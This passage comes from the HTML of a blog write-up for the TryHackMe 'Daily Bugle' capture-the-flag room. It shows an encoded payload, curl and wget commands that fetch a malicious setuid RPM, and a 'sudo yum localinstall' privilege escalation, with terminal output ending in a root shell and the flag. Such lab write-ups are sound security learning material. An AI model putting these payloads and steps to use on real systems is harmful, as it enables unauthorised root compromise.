vJl70+XMGXwe/fXFwcnNF38sZ3c4Uh9Vty+ukE33DYPrhpmdnO9+mBu5HtnfKdjcqBhgafCPN+Oh
RInBocfxkYH2msb++y2au7nPeHixGLHfClzckOfgv3/Ljo5juQxGr+qLmT9f/DRfjkHo/1HJTteV
Jt6sKsf3L2xsXPgw489lZoXj9V51Rr6XGCQ/5mdZ3fq3nNuh//+jpjl/zgi9UmO+9Pj+iQM1W/76
izco/5tsLPT5UnDxp8tfL63W2NYc8Pv+iQscuv98e3x93W7//8Lw6a4MT/Zyi2MGhp/nfXqWbSRQ
WB0h+W/i/muGWWVh5ftdg5wuKW7cE7xHLWZZtO27N3M/b7rzrtaif0nZC83L6Z97Xuk+l9J5W/x/
/+znftHLGC73snb9n/7FVuRa/7ttNUrhvyKdY/qz/QrOn98Sd1Th+9Pi7a36H7xT/HVj9CL2BqWd
vGXM3bxkUfmqP9o39f5vrFvQnCjS0xRowOV2UEOCdXECFk6bLAND7aMfHaAUAACKx3++WAQAAA==
</code></pre><p>The page says we need to make sure to save it as</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Again, be sure to save as .txt  </span>
cat *.txt |base64 -d|gzip -d &gt; debsploit.deb
</code></pre></div><p>Looking around a bit more I saw <a href="https://evi1ox.github.io/post/%E6%BB%A5%E7%94%A8sudo%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">this other post</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -sfL https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm | base64 -d | gzip -d&gt; yumsploit.rpm

</code></pre></div><p>trying to run this on the remote machine seems to be failing, we&rsquo;ll generate the payload rpm locally(which means just run that command and serve in our local HTTP server the yumsploit.rpm file)</p>
<p>Then we just do wget to upload that file and will try to install it with <strong>sudo yum localinstall yumsploit.rpm</strong> and hope for the best:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ ssh jjameson@10.10.61.166                                                                                             <span style="color:#ae81ff">1</span> ⨯
jjameson@10.10.61.166<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Last login: Fri Aug <span style="color:#ae81ff">28</span> 21:48:55 <span style="color:#ae81ff">2020</span>
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls
user.txt
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ wget http://10.13.0.34:8000/yumsploit.rpm
--2020-08-28 21:51:03--  http://10.13.0.34:8000/yumsploit.rpm
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">8267</span> <span style="color:#f92672">(</span>8.1K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/x-redhat-package-manager<span style="color:#f92672">]</span>
Saving to: ‘yumsploit.rpm’

100%<span style="color:#f92672">[====================================================================================</span>&gt;<span style="color:#f92672">]</span> 8,267       --.-K/s   in 0.003s  

2020-08-28 21:51:04 <span style="color:#f92672">(</span>2.79 MB/s<span style="color:#f92672">)</span> - ‘yumsploit.rpm’ saved <span style="color:#f92672">[</span>8267/8267<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ sudo yum localinstall yumsploit.rpm
Loaded plugins: fastestmirror
Examining yumsploit.rpm: sploit-1.0-1.x86_64
Marking yumsploit.rpm to be installed
Resolving Dependencies
--&gt; Running transaction check
---&gt; Package sploit.x86_64 0:1.0-1 will be installed
--&gt; Finished Dependency Resolution

Dependencies Resolved

<span style="color:#f92672">==============================================================================================================================</span>
 Package                      Arch                         Version                     Repository                        Size
<span style="color:#f92672">==============================================================================================================================</span>
Installing:
 sploit                       x86_64                       1.0-1                       /yumsploit                       8.5 k

Transaction Summary
<span style="color:#f92672">==============================================================================================================================</span>
Install  <span style="color:#ae81ff">1</span> Package

Total size: 8.5 k
Installed size: 8.5 k
Is this ok <span style="color:#f92672">[</span>y/d/N<span style="color:#f92672">]</span>: y
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : sploit-1.0-1.x86_64                                                                                        1/1 
  Verifying  : sploit-1.0-1.x86_64                                                                                        1/1 

Installed:
  sploit.x86_64 0:1.0-1                                                                                                       

Complete!
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ 

</code></pre></div><p>It seems to have succeded, let see if we have the expected way to rooting this room:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls -al /usr/local/bin/
total <span style="color:#ae81ff">12</span>
drwxr-xr-x.  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">17</span> Aug <span style="color:#ae81ff">28</span> 21:54 .
drwxr-xr-x. <span style="color:#ae81ff">12</span> root root  <span style="color:#ae81ff">131</span> Dec <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> ..
-rwsr-sr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">8744</span> Jan <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> pop
</code></pre></div><p>We have a <strong>pop</strong> file we can execute now!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ /usr/local/bin/pop
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># whoami</span>
root
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>jjameson<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># </span>

</code></pre></div><p>We made it! we rooted it! Let&rsquo;s grab that flag and get ready for a deserved time off the screen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
user.txt  yumsploit.rpm
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># cd ..</span>
<span style="color:#f92672">[</span>root@dailybugle home<span style="color:#f92672">]</span><span style="color:#75715e"># cd ..</span>
<span style="color:#f92672">[</span>root@dailybugle /<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
<span style="color:#f92672">[</span>root@dailybugle /<span style="color:#f92672">]</span><span style="color:#75715e"># cd root</span>
<span style="color:#f92672">[</span>root@dailybugle root<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
anaconda-ks.cfg  root.txt
<span style="color:#f92672">[</span>root@dailybugle root<span style="color:#f92672">]</span><span style="color:#75715e"># cat root.txt</span>
eec<span style="color:#f92672">{</span>REDACTED_ROOT_FLAG<span style="color:#f92672">}</span>fa6f79
</code></pre></div><p>A lot of failed attempts to get this one, but it was definitely fun! I learnt a lot by failing with my approaches, having to reasearch and finally being able to step by step root this room! I hope you enjoy it as well.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>



        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> with
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
</div>

    </div>
  </body>
</html>
